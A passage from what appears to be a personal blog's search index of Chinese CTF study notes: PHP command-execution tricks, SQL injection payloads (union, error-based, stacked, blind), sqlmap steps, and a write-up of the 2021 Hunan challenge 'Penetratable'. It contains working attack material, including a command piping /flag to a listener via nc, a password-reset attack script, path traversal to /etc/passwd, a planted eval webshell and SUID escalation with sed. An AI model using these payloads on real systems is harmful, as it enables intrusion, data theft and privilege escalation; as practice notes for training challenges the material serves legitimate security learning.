(array_search(&quot;NSS&quot;, $arr4y) === 0) &#123;        $checker_4 = TRUE;    &#125;&#125;//直接数组if ($checker_1 &amp;&amp; $checker_2 &amp;&amp; $checker_3 &amp;&amp; $checker_4) &#123;    echo $rce;&#125;\n\n得到Rc3_function.php\n&lt;?phperror_reporting(0);highlight_file(__FILE__);$nss=$_POST[&#x27;nss&#x27;];$shell = $_POST[&#x27;shell&#x27;];if(isset($shell)&amp;&amp; isset($nss))&#123;    $nss_shell = create_function($shell,$nss);&#125; \n\n\ncreate_function()会创建一个匿名函数,格式如下所示:\nfunction lambda_1($a,$b){\n …….\n}\nshell&#x3D;&amp;nss&#x3D;}system(‘ls’);&#x2F;&#x2F;\n","tags":["wp"]},{"title":"rce","url":"/2025/02/24/rce/","content":"rce一些命令常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()\n无参数函数print_r()、scandir()与highlight_file(‘);\ncat tac more less tail uniq od nl grep sort xxd strings\n\nxxd:读取二进制文件     od:以二进制读取   \ngrep (查找字段,flag) /flag\n\nob_start函数会接收我们往流里输入的参数\n&lt;?php$cmd = &#x27;system&#x27;;ob_start($cmd);echo &quot;whoami&quot;;ob_end_flush();?&gt;\n\n执行system(‘whoami’)\n长度限制前置知识：\n\n和&gt;&gt;：\n\n\nb 类似于touch b，即直接创建文件b，通过&gt;来将命令执行结果写入文件会覆盖掉文件原本的内容\n\necho kuai &gt; a  #创建文件a，并把字符串’kuai’写入到文件a里\n\n\n用来追加内容\n\n\nkuai &gt;&gt;a   #在文件a末尾追加字符串’kuai’\nls -t命令：按时间顺序，由近及远排序（后创建的排在前面，只能精确到秒）\n组合运用示例:#&gt;ag\n#&gt;fl#&gt;”t”#&gt;ca#ls -tca ‘t ‘ fl ag\n按时间顺序反向依次创建文件，”ca” “‘t “ “fl” “ag”再通过ls -t &gt; x，创建文件x，并把’Is -t执行结果写入文件x里 。\n实际上在创建文件时，加入”&quot;，把命令”ca””t””f””ag”连接起来\n#&gt;ag#fl\\#&gt;”t\\“#&gt;ca\\#ls -t &gt; a       \n前面的‘\\’把后面的‘\\’实体化变成字符 ，把一段已经拼接好的文件名输出到输出到一个文件a里，然后把这个文件a当成一个脚本去执行\nsh：sh命令是shell命令语言解释器，执行命令从标准输入读取或从一个文件中读取\ndir及*：*：相当于$(dir *)\n#dir *echo ffff#$(dir )ffff            &#x2F;&#x2F;执行echo命令输出ffff#ffff            &#x2F;&#x2F;执行echo命令输出ffff\n如果第一个文件名是命令的话就会执行命令,返回执行的结果，之后的文件名作为参数传入 \nrev:翻转文件每一行内容\n长度限制为7绕过方法：期望执行的命令：\ncat &#x2F;flag|nc 192.168.1.124 7777   \ncat &#x2F;flag展示内容，再通过nc反弹提交到192.168.1.124:7777，kali的IP地址192.168.1.124监听端口7777 \n去kali把监听打开 ：\nnc -lvp 7777\n 利用逻辑：\n\n创建短的文件名Is -t 按时间顺序列出文件名，按行储存\\连接换行命令sh从文件中读取命令\n\n?cmd&#x3D;&gt;7777\n?cmd&#x3D;&gt;\\ \\\n?cmd&#x3D;&gt;&gt;124\\\n?cmd&#x3D;&gt;1.\\\n?cmd&#x3D;&gt;168.\\\n?cmd&#x3D;&gt;192.\\\n?cmd&#x3D;&gt;c\\ \\\n?cmd&#x3D;&gt;|n\\\n?cmd&#x3D;&gt;flag\\\n?cmd&#x3D;&gt;t\\ \\\n?cmd&#x3D;&gt;ca\\    #从近往远的文件名能构成命令cat &#x2F;flag|nc 192.168.1.124 7777?cmd&#x3D;ls -t&gt;a   #将文件名按从近往远的顺序写入到文件a\n无数字字母自增"},{"title":"来吧SQL！我准备好了","url":"/2025/03/22/%E6%9D%A5%E5%90%A7SQL%EF%BC%81%E6%88%91%E5%87%86%E5%A4%87%E5%A5%BD%E4%BA%86/","content":" 留言\n0&#x27;union select 1,2,3&#x27;0&#x27;union select 1,(select group_concat(table_name) COLLATE utf8_general_ci from information_schema.tables where table_schema like database()),3&#x27;\n\nmessages,seeeeecret\n0&#x27;union select 1,(select group_concat(column_name) COLLATE utf8_general_ci from information_schema.columns where table_schema like database()),3&#x27;\n\nid,title,content,secret,user\n0&#x27;union select 1,(select group_concat(secret) COLLATE utf8_general_ci from seeeeecret where user like &#x27;nss&#x27;),3&#x27;或0&#x27;union select 1,(select group_concat(secret) COLLATE utf8_general_ci from seeeeecret),3&#x27;\n","tags":["2024秋季NSS内部训练赛 WEEK3 联合注入"]},{"title":"[湖湘杯 2021 final]Penetratable","url":"/2025/03/19/%E6%B9%96%E6%B9%98%E6%9D%AF-2021-final-Penetratable/","content":" 见登录，爆密码，没成功，看见有注册，用admin”#注册改密码顶掉admin，成功登录，接着不明所以，扫目录，发现一大堆空白的php，逐一翻找，发现了req.js\nfunction login()&#123;    let name=encodeURIComponent(Base64.encode($(&quot;.form-floating&gt;input&quot;).eq(0).val()))    let pass=hex_md5($(&quot;.form-floating&gt;input&quot;).eq(1).val())    $.ajax(&#123;        url: &#x27;/?c=app&amp;m=login&#x27;,        type: &#x27;post&#x27;,        data: &#x27;name=&#x27; + name+&#x27;&amp;pass=&#x27; + pass,        // async:true,        dataType: &#x27;text&#x27;,        success: function(data)&#123;            let res=$.parseJSON(data);            if (res[&#x27;login&#x27;])&#123;                switch (res[&#x27;type&#x27;])&#123;                    case &#x27;user&#x27;: location.href=&quot;/?c=user&quot;; break;                    case &#x27;admin&#x27;: location.href=&quot;/?c=admin&quot;; break;                    case &#x27;root&#x27;: location.href=&quot;/?c=root&quot;; break;                &#125;            &#125;else if(res[&#x27;alertFlag&#x27;])&#123;                alert(res[&#x27;alertData&#x27;]);            &#125;        &#125;    &#125;);&#125;function userUpdateInfo()&#123;    let name=encodeURIComponent(Base64.encode($(&quot;.input-group&gt;input&quot;).eq(0).val()))    let oldPass=$(&quot;.input-group&gt;input&quot;).eq(1).val()?hex_md5($(&quot;.input-group&gt;input&quot;).eq(1).val()):&#x27;&#x27;;    let newPass=$(&quot;.input-group&gt;input&quot;).eq(2).val()?hex_md5($(&quot;.input-group&gt;input&quot;).eq(2).val()):&#x27;&#x27;;    let saying=encodeURIComponent(Base64.encode($(&quot;.input-group&gt;input&quot;).eq(3).val()))    $.ajax(&#123;        url: &#x27;/?c=user&amp;m=updateUserInfo&#x27;,        type: &#x27;post&#x27;,        data: &#x27;name=&#x27;+name+&#x27;&amp;newPass=&#x27;+newPass+&#x27;&amp;oldPass=&#x27;+oldPass+&#x27;&amp;saying=&#x27;+saying,        // async:true,        dataType: &#x27;text&#x27;,        success: function(data)&#123;            alertHandle(data);        &#125;    &#125;);&#125;function signOut()&#123;    $.ajax(&#123;        url: &#x27;/?c=app&amp;m=signOut&#x27;,        type: &#x27;get&#x27;,        dataType: &#x27;text&#x27;,        success: function(data)&#123;            alertHandle(data);        &#125;    &#125;);&#125;function alertHandle(data)&#123;    let res=$.parseJSON(data);    if(res[&#x27;alertFlag&#x27;])&#123;        alert(res[&#x27;alertData&#x27;]);    &#125;    if(res[&#x27;location&#x27;])&#123;        location.href=res[&#x27;location&#x27;];    &#125;&#125;function changeAdminPage(type)&#123;    let page=$(&#x27;.page&#x27;).text();    if (type==&#x27;next&#x27;)&#123;        location.href=&#x27;?c=admin&amp;m=getUserList&amp;page=&#x27;+(parseInt(page)+1);    &#125;    if (type==&#x27;last&#x27;)&#123;        location.href=&#x27;?c=admin&amp;m=getUserList&amp;page=&#x27;+(parseInt(page)-1);    &#125;&#125;function changeRootPage(type)&#123;    let page=$(&#x27;.page&#x27;).text();    if (type==&#x27;next&#x27;)&#123;        location.href=&#x27;?c=root&amp;m=getUserInfo&amp;page=&#x27;+(parseInt(page)+1);    &#125;    if (type==&#x27;last&#x27;)&#123;        location.href=&#x27;?c=root&amp;m=getUserInfo&amp;page=&#x27;+(parseInt(page)-1);    &#125;&#125;function updatePass()&#123;    // let name=encodeURIComponent(Base64.encode($(&quot;.input-group&gt;input&quot;).eq(0).val()))    // let oldPass=$(&quot;.input-group&gt;input&quot;).eq(1).val()?hex_md5($(&quot;.input-group&gt;input&quot;).eq(1).val()):&#x27;&#x27;;    // let newPass=$(&quot;.input-group&gt;input&quot;).eq(2).val()?hex_md5($(&quot;.input-group&gt;input&quot;).eq(2).val()):&#x27;&#x27;;    // let saying=encodeURIComponent(Base64.encode($(&quot;.input-group&gt;input&quot;).eq(3).val()))    // $.ajax(&#123;    //     url: &#x27;/?c=admin&amp;m=updatePass&#x27;,    //     type: &#x27;post&#x27;,    //     data: &#x27;name=&#x27;+name+&#x27;&amp;newPass=&#x27;+newPass+&#x27;&amp;oldPass=&#x27;+oldPass+&#x27;&amp;saying=&#x27;+saying,    //     // async:true,    //     dataType: &#x27;text&#x27;,    //     success: function(data)&#123;    //         alertHandle(data);    //     &#125;    // &#125;);&#125;function adminHome()&#123;    location.href=&#x27;/?c=root&#x27;&#125;function getUserInfo()&#123;    location.href=&#x27;/?c=root&amp;m=getUserInfo&#x27;&#125;function getLogList()&#123;    location.href=&#x27;/?c=root&amp;m=getLogList&#x27;&#125;function downloadLog(filename)&#123;    location.href=&#x27;/?c=root&amp;m=downloadRequestLog&amp;filename=&#x27;+filename;&#125;function register()&#123;    let name=encodeURIComponent(Base64.encode($(&quot;.form-floating&gt;input&quot;).eq(2).val()))    let pass=hex_md5($(&quot;.form-floating&gt;input&quot;).eq(3).val())    let saying=encodeURIComponent(Base64.encode($(&quot;.form-floating&gt;input&quot;).eq(4).val()))    $.ajax(&#123;        url: &#x27;/?c=app&amp;m=register&#x27;,        type: &#x27;post&#x27;,        data: &#x27;name=&#x27; + name+&#x27;&amp;pass=&#x27; + pass +&#x27;&amp;saying=&#x27; +saying,        dataType: &#x27;text&#x27;,        success: function(data)&#123;            // console.log(data);            alertHandle(data);        &#125;    &#125;);&#125;\n\n看见有root，用同样的方法顶，没有权限改密码，看别人的wp知道了要发包，用admin用户改root的密码\nimport base64from hashlib import md5import requestsurl1=&quot;http://node4.anna.nssctf.cn:28119/?c=app&amp;m=login&quot;name=base64.b64encode(&#x27;admin&#x27;.encode(&#x27;utf-8&#x27;)).decode()password = md5(b&#x27;123&#x27;).hexdigest()pass2=md5(b&#x27;root&#x27;).hexdigest()url2=&quot;http://node4.anna.nssctf.cn:28119/?c=admin&amp;m=updatePass&quot;name2=base64.b64encode(&#x27;root&#x27;.encode(&#x27;utf-8&#x27;)).decode()sess=requests.session()res1=sess.post(url=url1,data=&#123;&quot;name&quot;:name,&quot;pass&quot;:password&#125;);print(res1.text)res2=sess.post(url=url2,data=&#123;&quot;name&quot;:name2,                              &quot;newPass&quot;:pass2,                              &quot;oldPass&quot;:password,                              &quot;saying&quot;:&quot;666&quot;&#125;)print(res2.text)\n\n再次登录，能够下载文件了，看见filename&#x3D;，试了试目录遍历，找到filename&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd,以此进入..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;phpinfo.php,得到新线索\n&lt;?php if(md5(@$_GET[&#x27;pass_31d5df001717&#x27;])===&#x27;3fde6bb0541387e4ebdadf7c2ff31123&#x27;)&#123;@eval($_GET[&#x27;cc&#x27;]);&#125; // hint: Checker will not detect the existence of phpinfo.php, please delete the file when fixing the vulnerability.?&gt;\n\n让ai写了个脚本爆md5，结果是1q2w3e\n再来到空白的&#x2F;phpinfo.php，传参，cc可以执行ls &#x2F;但cat不了flag，权限不够，改为写马，\n/phpinfo.php?pass_31d5df001717=1q2w3e&amp;cc=@eval($_POST[1]);\n\n蚁剑链接，suid提权\nfind / -user root -perm -4000 -print\n\n找到&#x2F;bin&#x2F;sed,于是\nsed -n &#x27;1p&#x27; /flag\n\nsed选项:\n常见的sed命令选项包含以下几种：-e或-expression=：表示用指定命令或者脚本来处理输入的文本文件-f或-file-：表示用指定的脚本文件来处理输入的文件文件-h或–help：显示帮助-n、-quite或silent：表示仅表示处理后的结果-i：直接编辑文本文件\n\nsed操作：\na：增加，在当前行下面增加一行指定内容。c：替换，讲选定行替换为指定内容。d：删除，删除选定的行。i：插入，在选定行上面插入一行指定内容。p：打印，如果同时指定行，表示打印指定行；如果不指定行，则表示打印所有内容，如果又非打印字符，则以ASCLL码输出。通常与“-n”选项一起使用。s：替换，替换指定字符y：字符转换\n\n","tags":["SUID提权 二次注入 目录穿越"]},{"title":"笔记","url":"/2025/02/24/sql/","content":"Sql空格-&gt;%09\n&#x3D;-&gt;like\nand-&gt;&amp;&amp;\nillegal mix of collation operation ‘UNION’\n这个错误意味着在UNION查询中的两个或多个列使用了不同的字符集或校对规则，导致无法进行正确的合并 操作。 解决方法：统一字符集和校对规则，在sql语句from前添加COLLATE utf8_general_ci\nsql语句加锁，有个提示用户只能从nss来的\n所以sql语句后加where user &#x3D; ‘nss’\n‘ - ‘ 被过滤了所以用100使前面查询不出内容，得到库名\n堆叠注入(emm，博客里说过滤了select就是堆叠)\n以;结束命令再在后面加命令一起执行，（这么说所有都可以用堆叠注入喽?）\n补：不是，有什么API巴拉巴拉的限制，可能不行\n命令:\n查数据库(感觉没啥用，爆表会默认当前数据库): 1’; show databases;\n查表: 1’; show tables;\n爆表: *1’;show columns from *(*表名)*;#\n(表名为数字加  )\n查字段(select被禁)：[强网杯 2019]随便注1\n1’;Handler 1919810931114514 OPEN;Handler 1919810931114514 read first;Handler 1919810931114514 close;#\n1’; handler 1919810931114514 open as a; handler a read next;#\n报错注入获取数据库名\n1’ and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) –+\n不太稳定，嗯\n1’ and extractvalue(1,concat(‘^’,(select database()),’^’)) –+\n1’ and updatexml(1,concat(‘^’,(database()),’^’),1) –+\n1’or(updatexml(1,concat(0x7e,database(),0x7e),1))#\n表\n1’ and updatexml(1,concat(‘^’,(select table_name from information_schema.tables where table_schema&#x3D;’security’ ),’^’),1) –+\n1’or(updatexml(1,concat(‘^’,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),’^’),1))\n若超过一行则在table_schema&#x3D;’security’后面加limit 0，1，意思是只显示第一行\nLimit 1，1   2，1   3，1往下一行看\n列\n1’ and updatexml(1,concat(‘^’,(select column_name from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;’security’ limit 0,1 ),’^’),1) –+\n1’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1))#\n字段\n1’ and updatexml(1,concat(‘^’,(select group_concat(username,”–”,password) from users limit 0,1 ),’^’),1) –+       只得到了一段\n1’or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#\n字段       表\n1’ and extractvalue(1,concat(‘^’,(select substring(group_concat(id,’^’,flag),31,30) from test_tb)))#          第二段,31,30意思是从第31个字符往后提取30个字符，可改\n联合注入新生赛wp(现在看应该是数字型，那为什么能直接用呢？还是说是单引号型，只是碰巧)\n先分别输入1，2，3，4，5，到5就不行了，所以有4段，再使用特定语句走流程\n查段数 1’ order by 3#\n1.   ‘ union select 1,2,3 – ‘\n2.   检查数据库信息’ union select 1, 2,3， @@version – ‘\n3.   查询数据库名’ union select 1, 2,3， database() – ‘\n4.   查用户权限’ union select 1, 2, 3，user() – ‘\n5.   查表1’ununionion seselectlect 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()# \n6.   爆表’ union select 1, 2,3, group_concat(table_name) from information_schema.tables where table_schema&#x3D;’ctf’– ‘\n7.      \n8.   爆列’ union select 1, 2,3, group_concat(column_name) from information_schema.columns where table_name&#x3D;’flag’ – ‘\n9.   查flag’ union select 1,2, group_concat(data) from flag– ‘\n1’ union select 1,2,group_concat(flag) from ctf.Flag\n1’ union select 1,2,group_concat(字段名) from 数据库名.表名\n布尔盲注刚看了布尔盲注，我勒个盲注啊，全用二分法一个个试啊，眉头一下子就皱起来了，好麻烦，很哈人，直到看到博主说：一般布尔盲注，手工去注入过于繁琐，不建议手工注入，可以借助于工具。把语句记下，去找工具了。\n1．数据库类型\n **&#x2F;&#x2F;**判断是否是 Mysql数据库\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and exists(select*from information_schema.tables) –+\n&#x2F;&#x2F;判断是否是 access数据库\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and exists(select*from msysobjects) –+\n&#x2F;&#x2F;判断是否是 Sqlserver数据库\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and exists(select*from sysobjects) –+\n2．数据库名\n1：判断当前数据库的长度，利用二分法\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length(database())&gt;5 –+ &#x2F;&#x2F;正常显示\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length(database())&gt;10 –+ &#x2F;&#x2F;不显示任何数据\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length(database())&gt;7 –+ &#x2F;&#x2F;正常显示\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length(database())&gt;8 –+ &#x2F;&#x2F;不显示任何数据\n 大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为8个字符\n2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断\n&#x2F;&#x2F;判断数据库的第一个字符\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and ascii(substr(database(),1,1))&gt;115 –+ &#x2F;&#x2F;100为ascii表中的十进制，对应字母s\n&#x2F;&#x2F;判断数据库的第二个字符\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and ascii(substr(database(),2,1))&gt;100 –+\n&#x2F;&#x2F;判断数据库的第三个字符\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and ascii(substr(database(),3,1))&gt;100 –+\n………..\n由此可以判断出当前数据库为 security\n3．库的表名\n&#x2F;&#x2F;猜测当前数据库中是否存在admin表\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and exists(select*from admin) –+\n1：判断当前数据库中表的个数\n&#x2F;&#x2F; 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&gt;3 –+\n2：判断每个表的长度\n&#x2F;&#x2F;判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;6 –+\n&#x2F;&#x2F;判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1))&#x3D;6 –+\n3：判断每个表的每个字符的ascii值\n&#x2F;&#x2F;判断第一个表的第一个字符的ascii值\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;100 –+\n&#x2F;&#x2F;判断第一个表的第二个字符的ascii值        \nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),2,1))&gt;100 –+\n由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断\n4.表的字段\n&#x2F;&#x2F;如果已经证实了存在admin表，那么猜测是否存在username字段\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and exists(select username from admin) \n1：判断表中字段的个数\n&#x2F;&#x2F;判断users表中字段个数是否大于5\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and (select count(column_name) from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;’security’)&gt;5 –+\n2：判断每个字段的长度\n&#x2F;&#x2F;判断第一个字段的长度\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1))&gt;5 –+\n&#x2F;&#x2F;判断第二个字段的长度  \nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 1,1))&gt;5 –+\n3：判断每个字段名字的ascii值\n&#x2F;&#x2F;判断第一个字段的第一个字符的ascii\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&gt;100 –+\n&#x2F;&#x2F;判断第一个字段的第二个字符的ascii\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),2,1))&gt;100 –+\n………..\n由此可判断出users表中存在 id、username、password 字段\n5.字段数据\n我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据\n1: 判断数据的长度\n&#x2F;&#x2F; 判断id字段的第一个数据的长度\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length((select id from users limit 0,1))&gt;5 –+\n&#x2F;&#x2F; 判断id字段的第二个数据的长度\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length((select id from users limit 1,1))&gt;5 –+\n2：判断数据的ascii值\n&#x2F;&#x2F; 判断id字段的第一行数据的第一个字符的ascii值\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and ascii(substr((select id from users limit 0,1),1,1))&gt;100 –+\n&#x2F;&#x2F; 判断id字段的第二行数据的第二个字符的ascii值\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and ascii(substr((select id from users limit 0,1),2,1))&gt;100 –+\n时间盲注和布尔盲注差不多，布尔是直接显示对错，时间以延迟表示对错，比布尔还麻烦\nhttp注入只是换了个地方注入，ua，xff，cookie等\nsqlmap快速入门；SQLmap（常规）使用步骤\n1、检测「注入点」\nsqlmap -u ‘http://xx/?id=1‘\n1\n2、查看所有「数据库」\nsqlmap -u ‘http://xx/?id=1‘ –dbs\n1\n3、查看当前使用的数据库\nsqlmap -u ‘http://xx/?id=1‘ –current-db\n1\n4、查看「数据表」\nsqlmap -u ‘http://xx/?id=1‘ -D ‘security’ –tables\n1\n5、查看「字段」\nsqlmap -u ‘http://xx/?id=1‘ -D ‘security’ -T ‘users’ –tables\n1\n6、查看「数据」\nsqlmap -u ‘http://xx/?id=1‘ -D ‘security’ -T ‘users’ –dump\n"}]